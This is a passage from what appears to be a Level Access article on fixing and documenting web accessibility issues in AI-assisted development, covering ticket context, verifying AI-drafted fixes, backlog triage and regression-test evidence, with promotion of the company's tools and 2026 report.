Found the issue? Great. Fix it while it’s fresh. When issues end up as tickets, make sure the context travels with them. They should carry the element, the repro, the related WCAG criterion, a suggested fix, and the PR link, so context doesn’t leak.

Move the guidance to the work.Whether the fix happens in the editor, the design file, or the component library, the answers should be right there. If your team uses an AI coding assistant, an MCP server can pull accessibility findings and fix guidance straight into it so developers can work through issues without leaving their editor. Level Access offers one that connects to tools like Cursor and Claude.

Let AI take the first pass.Use AI to draft, with guardrails. AI coding assistants can propose changes quickly, but they optimize for a passing check, not a correct experience. Give them grounded fix guidance for the specific issue, and treat their output as a draft. Open-source skill sets can help ground that guidance. A good starting point is the accessibility instructions file in the Awesome Copilot collection, which steers Copilot toward accessible patterns. Once you’ve got your draft, re-run the check, then review the semantics and test the behaviour because a green result can come from markup that looks right and isn’t (e.g., role="button" on a div, redundant ARIA, invented alt text). The speed is useful only if verification keeps pace.

Review before anything merges.Test the change in context. Did it solve the original problem without breaking anything else? Does the interaction now behave and announce itself as intended? Note: This gate is doing different work than the per-check testing upstream in “Find”: That caught the issue; this work confirms the fix actually holds in context.

Work the backlog by impact.Pulling older findings? Start with things that block someone from completing a key journey, like paying a bill or resetting a password. Then tackle the quickest fixes first. Include the component, what went wrong, and the guidance to fix it. Don’t expect someone to reconstruct the story.

3. Prove: Leave A Receipt

The worst time to start gathering evidence is when somebody’s asking for it.

Every check, fix, and judgment call throughout the process described above should ideally leave a trail. A fix isn’t done until something fails if the issue comes back. Ask your AI assistant to write the regression test with the fix and put the finding link and any judgment call in the PR description. That’s the receipt.

A passing test shows a known issue hasn’t returned. It doesn’t show the experience works. For what automation can’t cover, add a short note to the PR: what you tested, with which assistive technology, and any judgment calls you made.

Let tooling do the admin.When someone later asks what was tested and who approved it, tooling can assemble the answer from those PRs and tests. We cut VPAT/ACR authoring time by more than 70% this way with the Level Access Reporting Agent, but only because the evidence already existed. Again, the tool compounds a practice. It doesn’t replace one.

Keep The Speed: Move The Judgment With It

AI has given digital creation a speed boost, but broadly speaking, validating the work hasn’t kept pace. Closing that gap isn’t about adopting more AI in more places or abandoning the toolset that helped make your team faster.

According to our data, the opportunity in front of teams is to build the practice around that toolset, so that human judgment is flagged, embedded, and acted on earlier, and more often.

We’ve only scratched the surface of what our data tells us about AI and accessibility. If you’re curious about what else we found, check out the 2026 State of Digital Accessibility Report. There’s plenty more to unpack.
